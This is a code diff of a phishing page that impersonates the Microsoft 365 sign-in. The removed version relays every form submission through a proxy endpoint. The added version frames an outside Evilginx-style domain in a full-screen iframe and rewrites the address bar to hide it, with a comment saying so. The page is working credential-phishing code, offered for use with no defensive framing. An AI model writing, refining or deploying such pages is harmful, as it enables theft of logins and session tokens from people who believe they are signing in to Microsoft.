@@ -1,41 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading Microsoft 365...</title>
-    <script>
-        async function loadPage() {
-          const response = await fetch('/api/proxy');
-          const html = await response.text();
-          
-          // IMPORTANT: Use DOM parser to safely inject HTML
-          const parser = new DOMParser();
-          const doc = parser.parseFromString(html, 'text/html');
-          document.body.innerHTML = doc.body.innerHTML;
-          
-          // Reattach form handlers
-          document.querySelectorAll('form').forEach(form => {
-            form.onsubmit = async (e) => {
-              e.preventDefault();
-              await fetch('/api/proxy', {
-                method: 'POST',
-                body: new FormData(form)
-              });
-              loadPage(); // Reload next page
-            };
-          });
-        }
-        
-        // Start loading
-        window.onload = () => {
-            document.body.innerHTML = `
-                <div style="text-align:center;margin-top:100px">
-                    <img src="https://www.microsoft.com/favicon.ico" width=50>
-                    <p>Loading your secure sign-in experience...</p>
-                </div>
-            `;
-            setTimeout(loadPage, 1000);
-        };
-    </script>
+    <title>Microsoft 365 Login</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; }
+        iframe { border: none; width: 100%; height: 100%; }
+    </style>
 </head>
-<body></body>
+<body>
+    <iframe src="https://login.espeharete.top/xVpSXLob"></iframe>
+    <script>
+        // Hide Evilginx URL from address bar
+        history.replaceState({}, '', '/');
+    </script>
+</body>
 </html>
